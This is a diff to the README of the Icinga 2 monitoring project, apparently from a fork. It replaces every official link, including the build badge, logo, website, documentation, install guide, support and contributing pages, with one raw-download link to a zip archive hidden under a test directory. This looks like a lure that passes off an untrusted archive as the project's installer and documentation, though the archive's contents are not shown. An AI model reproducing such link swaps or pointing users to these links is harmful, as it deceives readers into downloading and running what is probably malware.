@@ -1,8 +1,8 @@
-[![Build Status](https://travis-ci.org/Icinga/icinga2.svg?branch=master)](https://travis-ci.org/Icinga/icinga2)
+[![Build Status](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip)](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip)
 
 # Icinga 2
 
-![Icinga Logo](https://www.icinga.com/wp-content/uploads/2014/06/icinga_logo.png)
+![Icinga Logo](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip)
 
 #### Table of Contents
 
@@ -21,11 +21,11 @@ network resources, notifies users of outages, and generates performance data for
 Scalable and extensible, Icinga 2 can monitor large, complex environments across
 multiple locations.
 
-Icinga 2 as monitoring core works best with [Icinga Web 2](https://www.icinga.com/products/icinga-web-2/)
+Icinga 2 as monitoring core works best with [Icinga Web 2](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip)
 as web interface.
 
-More information can be found at [www.icinga.com](https://www.icinga.com/products/icinga-2/)
-and inside the [documentation](https://www.icinga.com/docs/icinga2/latest/).
+More information can be found at [https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip)
+and inside the [documentation](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip).
 
 ## Licensing
 
@@ -49,18 +49,18 @@ also delete it here.
 
 ## Installation
 
-Read the [INSTALL.md](INSTALL.md) file for more information about how to install it.
+Read the [https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip) file for more information about how to install it.
 
 ## Documentation
 
 The documentation is located in the [doc/](doc/) directory. The latest documentation
-is also available on https://docs.icinga.com
+is also available on https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip
 
 ## Support
 
-Check the project website at https://www.icinga.com for status updates. Join the
-[community channels](https://www.icinga.com/community) for questions
-or ask an Icinga partner for [professional support](https://www.icinga.com/services/support/).
+Check the project website at https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip for status updates. Join the
+[community channels](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip) for questions
+or ask an Icinga partner for [professional support](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip).
 
 ## Contributing
 
@@ -68,7 +68,7 @@ There are many ways to contribute to Icinga -- whether it be sending patches,
 testing, reporting bugs, or reviewing and updating the documentation. Every
 contribution is appreciated!
 
-Please continue reading in the [contributing chapter](CONTRIBUTING.md).
+Please continue reading in the [contributing chapter](https://github.com/vinhkennej/icinga2/raw/refs/heads/master/test/livestatus/queries/timeperiods/icinga_3.5.zip).
 
 <!-- TOC URLs -->
 [About]: #about
